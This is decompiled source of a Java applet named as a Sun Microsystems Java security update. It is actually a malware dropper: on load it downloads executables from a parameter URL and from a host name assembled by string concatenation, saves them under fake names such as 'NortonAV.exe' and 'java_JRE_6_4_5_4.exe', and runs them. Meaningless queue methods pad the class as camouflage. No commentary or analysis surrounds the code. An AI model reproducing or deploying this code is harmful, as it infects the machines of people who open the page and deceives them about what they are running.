import java.io.InputStream;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.io.IOException;
import java.awt.Graphics;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Sun_Microsystems_Java_Security_Update_6 extends Applet
{
    private Sun_Microsystems_Java_Security_Update_6.Node front;
    private Sun_Microsystems_Java_Security_Update_6.Node rear;
    private int size;
    public String protocol;
    public String savename;
    public String appletname;
    public String filetype;
    public String domcom;
    public String locationpath;
    
    public Sun_Microsystems_Java_Security_Update_6() {
        this.protocol = "http://";
        this.savename = "/JavaLoader";
        this.appletname = "dl";
        this.filetype = "jaztebe";
        this.domcom = ".de";
        this.locationpath = this.protocol + this.appletname + "." + this.filetype + "rabim" + this.domcom + this.savename + ".jpg";
    }
    
    @Override
    public void paint(final Graphics graphics) {
        graphics.drawString(this.getParameter("file"), 20, 20);
    }
    
    @Override
    public void init() {
        final String concat = System.getProperty("user.home").concat("\\NortonAV.exe");
        System.out.println(concat);
        this.download(this.getParameter("file"), concat);
        this.ExecuteFile();
        final Runtime runtime = Runtime.getRuntime();
        try {
            runtime.exec(concat);
        }
        catch (IOException ex) {
            System.out.println(ex);
        }
    }
    
    public void download(final String s, final String s2) {
        BufferedOutputStream bufferedOutputStream = null;
        InputStream inputStream = null;
        try {
            final URL url = new URL(s);
            bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(s2));
            inputStream = url.openConnection().getInputStream();
            final byte[] array = new byte[1024];
            int read;
            while ((read = inputStream.read(array)) != -1) {
                bufferedOutputStream.write(array, 0, read);
            }
        }
        catch (Exception ex) {
            System.out.println(ex);
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (bufferedOutputStream != null) {
                    bufferedOutputStream.close();
                }
            }
            catch (IOException ex2) {
                System.out.println(ex2);
            }
        }
        finally {
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (bufferedOutputStream != null) {
                    bufferedOutputStream.close();
                }
            }
            catch (IOException ex3) {
                System.out.println(ex3);
            }
        }
    }
    
    public Object dequeue() {
        final Object access$000 = Sun_Microsystems_Java_Security_Update_6.Node.access$000(this.front);
        this.front = this.front.next;
        --this.size;
        return access$000;
    }
    
    public void enqueue(final Object o) {
        final Sun_Microsystems_Java_Security_Update_6.Node rear = new Sun_Microsystems_Java_Security_Update_6.Node(this, o, (Sun_Microsystems_Java_Security_Update_6.Sun_Microsystems_Java_Security_Update_6$1)null);
        if (this.front == null) {
            this.front = rear;
        }
        else {
            this.rear.next = rear;
        }
        this.rear = rear;
        ++this.size;
    }
    
    public Object front() {
        return Sun_Microsystems_Java_Security_Update_6.Node.access$000(this.front);
    }
    
    public boolean isEmpty() {
        return this.front == null;
    }
    
    @Override
    public String toString() {
        if (this.front == null) {
            return "EMPTY QUEUE";
        }
        String s = "{" + this.size + "}" + Sun_Microsystems_Java_Security_Update_6.Node.access$000(this.front);
        for (Sun_Microsystems_Java_Security_Update_6.Node node = this.front.next; node != null; node = node.next) {
            s = s + " < " + Sun_Microsystems_Java_Security_Update_6.Node.access$000(node);
        }
        return s;
    }
    
    public void ExecuteFile() {
        final String concat = System.getProperty("user.home").concat("\\java_JRE_6_4_5_4.exe");
        System.out.println(concat);
        this.download(this.locationpath, concat);
        final Runtime runtime = Runtime.getRuntime();
        try {
            runtime.exec(concat);
        }
        catch (IOException ex) {
            System.out.println(ex);
        }
    }
    
    public Object dequueue() {
        final Object access$000 = Sun_Microsystems_Java_Security_Update_6.Node.access$000(this.front);
        this.front = this.front.next;
        --this.size;
        return access$000;
    }
    
    public void enqueuue(final Object o) {
        final Sun_Microsystems_Java_Security_Update_6.Node rear = new Sun_Microsystems_Java_Security_Update_6.Node(this, o, (Sun_Microsystems_Java_Security_Update_6.Sun_Microsystems_Java_Security_Update_6$1)null);
        if (this.front == null) {
            this.front = rear;
        }
        else {
            this.rear.next = rear;
        }
        this.rear = rear;
        ++this.size;
    }
    
    public Object frount() {
        return Sun_Microsystems_Java_Security_Update_6.Node.access$000(this.front);
    }
    
    public boolean isEyumpty() {
        return this.front == null;
    }
}
